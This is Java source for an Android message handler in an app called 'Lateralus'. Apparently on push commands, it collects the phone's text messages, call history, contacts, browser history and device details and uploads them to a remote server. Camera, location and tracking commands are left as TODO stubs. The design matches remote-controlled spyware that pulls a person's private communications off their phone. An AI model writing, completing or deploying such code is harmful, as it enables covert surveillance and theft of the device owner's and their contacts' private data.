package net.scottjulian.lateralus;


import android.content.Context;
import android.location.Location;
import android.util.Log;

import net.scottjulian.lateralus.components.location.LocDelegate;
import net.scottjulian.lateralus.components.network.Network;
import net.scottjulian.lateralus.components.readers.ContactReader;
import net.scottjulian.lateralus.components.readers.DeviceReader;
import net.scottjulian.lateralus.components.readers.InternetHistoryReader;
import net.scottjulian.lateralus.components.readers.PhonecallReader;
import net.scottjulian.lateralus.components.readers.TextMessageReader;

import org.json.JSONException;
import org.json.JSONObject;


public class LateralusMessageHandler {
    private static final String TAG = "LateralusMsgHandler";

    public static final String CMD_KEY = "command";
    public static final String CMD_TAKE_PIC       = "take_picture";
    public static final String CMD_GET_TEXT_MSGS  = "get_textmessages";
    public static final String CMD_GET_PHONECALLS = "get_phonecalls";
    public static final String CMD_GET_LOCATION   = "get_location";
    public static final String CMD_GET_CONTACTS   = "get_contacts";
    public static final String CMD_GET_HISTORY    = "get_history";
    public static final String CMD_START_TRACKING = "start_tracking";
    public static final String CMD_STOP_TRACKING  = "stop_tracking";

    public static final String KEY_DATA = "data";

    private LocationDelegate _locDelegate;

    public static void processMessage(Context ctx, JSONObject data){
        try{
            DeviceReader deviceReader = new DeviceReader(ctx);
            JSONObject jsonData = deviceReader.getData();
            switch(data.getString(CMD_KEY)){
                case CMD_TAKE_PIC:
                    //TODO
                    break;

                case CMD_GET_TEXT_MSGS:
                    TextMessageReader txtReader = new TextMessageReader(ctx);
                    jsonData.put(KEY_DATA, txtReader.getData());
                    break;

                case CMD_GET_PHONECALLS:
                    PhonecallReader phoneReader = new PhonecallReader(ctx);
                    jsonData.put(KEY_DATA, phoneReader.getData());
                    break;

                case CMD_GET_CONTACTS:
                    ContactReader conReader = new ContactReader(ctx);
                    jsonData.put(KEY_DATA, conReader.getData());
                    break;

                case CMD_GET_HISTORY:
                    InternetHistoryReader ihReader = new InternetHistoryReader(ctx);
                    jsonData.put(KEY_DATA, ihReader.getData());
                    break;

                case CMD_GET_LOCATION:
                    //TODO
                    break;

                case CMD_START_TRACKING:
                    //TODO
                    return;

                case CMD_STOP_TRACKING:
                    //TODO
                    return;

            }

            if(jsonData != null){
                Network.fireJsonData(ctx, Network.API_PUT, jsonData);
            }
            else{
                Log.e(TAG, "Error: JSON data was empty!");
            }
        }
        catch(JSONException e){
            Log.e(TAG, "Error creating data for the gcm request");
            e.printStackTrace();
        }
    }



    private class LocationDelegate implements LocDelegate {

        @Override
        public void onLocationReceived(Location loc) {

        }

        @Override
        public void onErrorRecevied() {

        }
    }

}
